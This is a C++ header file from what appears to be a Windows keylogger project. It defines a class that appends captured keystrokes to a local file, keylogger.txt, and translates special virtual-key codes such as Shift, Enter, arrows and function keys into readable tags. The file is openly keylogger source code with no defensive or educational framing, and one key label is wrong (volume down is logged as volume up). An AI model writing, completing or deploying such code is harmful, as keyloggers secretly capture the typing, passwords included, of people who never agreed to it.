#ifndef KEYLOGGER_SAVEDATA_H
#define KEYLOGGER_SAVEDATA_H

#include <iostream>
#include <fstream>
#include <winuser.h>

using namespace std;

class saveData {
    #define LOG_FILE "keylogger.txt"

    public:
        //Save data into log file
        static void save_data(string data){
            fstream logFile;

            //open file
            //ios::app will make the new data append to the file
            logFile.open(LOG_FILE,ios::app);

            //Write data into log file
            logFile << data;

            //close file
            logFile.close();
        }
        //Translating special keys into string
        static string TranslateSpecialKey(int key){
            string results;
            switch (key) {
                case VK_SPACE:
                    //Space key
                    results=" ";
                    break;
                case VK_RETURN:
                    // new Line key
                    // or enter
                    results="\n";
                    break;
                case VK_BACK:
                    //Backspace key
                    results="\b";
                    break;
                case VK_CAPITAL:
                    //CapsLock key
                    results="[CAPS_LOCK]";
                    break;
                case VK_SHIFT:
                    //Shift key
                    results="[SHIFT]";
                    break;
                case VK_TAB:
                    //Tab key
                    results="[TAB]";
                    break;
                case VK_CONTROL:
                    //Control key
                    results="[CTRL]";
                    break;
                case VK_MENU:
                    //ALT key
                    results="[ALT]";
                    break;
                case VK_ESCAPE:
                    //Esc key
                    results="[ESC]";
                    break;
                case VK_DECIMAL:
                    results=".";
                    break;
                case VK_DIVIDE:
                    results="/";
                    break;
                case VK_SUBTRACT:
                    results="-";
                    break;
                case VK_ADD:
                    results="+";
                    break;
                case VK_DELETE:
                    results="[DELETE]";
                    break;
                case VK_DOWN:
                    results="[ARROW DOWN]";
                    break;
                case VK_UP:
                    results="[ARROW UP]";
                    break;
                case VK_LEFT:
                    results="[ARROW LEFT]";
                    break;
                case VK_RIGHT:
                    results="[ARROW RIGHT]";
                    break;
                case VK_NUMLOCK:
                    results="[NUM LOCK]";
                    break;
                case VK_PRIOR:
                    results="[PAGE UP]";
                    break;
                case VK_NEXT:
                    results="[PAGE DOWN]";
                    break;
                case VK_HOME:
                    results="[HOME]";
                    break;
                case VK_END:
                    results="[END]";
                    break;
                case VK_F1:
                    results="[F1]";
                    break;
                case VK_F2:
                    results="[F2]";
                    break;
                case VK_F3:
                    results="[F3]";
                    break;
                case VK_F4:
                    results="[F4]";
                    break;
                case VK_F5:
                    results="[F5]";
                    break;
                case VK_F6:
                    results="[F6]";
                    break;
                case VK_F7:
                    results="[F7]";
                    break;
                case VK_F8:
                    results="[F8]";
                    break;
                case VK_F9:
                    results="[F9]";
                    break;
                case VK_F10:
                    results="[F10]";
                    break;
                case VK_F11:
                    results="[F11]";
                    break;
                case VK_F12:
                    results="[F12]";
                    break;
                case VK_SCROLL:
                    results="[SCROLL LOCK]";
                    break;
                case VK_SNAPSHOT:
                    results="[PrtSc]";
                    break;
                case VK_VOLUME_DOWN:
                    results="[VOLUME UP]";
                    break;
                case VK_VOLUME_MUTE:
                    results="[VOLUME MUTE]";
                    break;
                case VK_VOLUME_UP:
                    results="[VOLUME UP]";
                    break;
                case VK_INSERT:
                    results="[INSERT]";
                    break;
                default:
                    break;
            }
            return results;
        }
};


#endif //KEYLOGGER_SAVEDATA_H
